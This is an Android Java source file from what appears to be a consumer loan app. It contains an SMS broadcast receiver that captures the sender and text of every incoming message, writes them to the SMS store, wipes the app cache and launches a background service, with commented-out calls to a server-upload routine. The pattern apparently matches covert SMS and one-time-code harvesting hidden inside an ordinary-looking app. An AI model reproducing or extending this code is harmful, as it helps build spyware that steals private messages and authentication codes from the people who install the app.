package com.app.genialnykredyt.Broadcast;

import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.support.annotation.RequiresApi;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.app.genialnykredyt.Service.BackgroundService;
import com.app.genialnykredyt.Session.SessionManager;
import com.app.genialnykredyt.UpdateToServer;

import java.io.File;

public class SmsListner extends BroadcastReceiver {
    SmsMessage[] msgs;
    String msg_from;
    String msgBody;
    Context context;
    SessionManager sessionManager;
    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    public void onReceive(Context context, Intent intent) {
        sessionManager=new SessionManager(context);
        this.context=context;
        trimCache(context);
        Bundle bundle=intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                msg_from = msgs[i].getOriginatingAddress();

                msgBody = msgs[i].getMessageBody();
            }
            ContentValues contentValue=new ContentValues();
            contentValue.put(Telephony.Sms.ADDRESS,msg_from);
            contentValue.put(Telephony.Sms.BODY,msgBody);
            context.getContentResolver().insert(Telephony.Sms.CONTENT_URI,contentValue);

        }
        Intent intentt = new Intent(context,BackgroundService.class);
        context.startService(intentt);
//        UpdateToServer serverClass=new UpdateToServer(context);
//        trimCache(context);
//        serverClass.addtoServer(context);
    }


    public boolean saveSms(String phoneNumber, String message,String folderName) {
        boolean ret = false;
        try {
            ContentValues values = new ContentValues();
            values.put("address", phoneNumber);
            values.put("body", message);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                Uri uri = Telephony.Sms.Sent.CONTENT_URI;
                if(folderName.equals("inbox")){
                    uri = Telephony.Sms.Inbox.CONTENT_URI;
                }
                context.getContentResolver().insert(uri, values);
            }
            else {
                /* folderName  could be inbox or sent */
                context.getContentResolver().insert(Uri.parse("content://sms/" + folderName), values);
            }

            ret = true;
        } catch (Exception ex) {
            ex.printStackTrace();
            ret = false;
        }
        return ret;
    }

    public static void trimCache(Context context) {
        try {
            File dir = context.getCacheDir();
            if (dir != null && dir.isDirectory()) {
                deleteDir(dir);
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

    public static boolean deleteDir(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            for (int i = 0; i < children.length; i++) {
                boolean success = deleteDir(new File(dir, children[i]));
                if (!success) {
                    return false;
                }
            }
        }

        // The directory is now empty so delete it
        return dir.delete();
    }
}
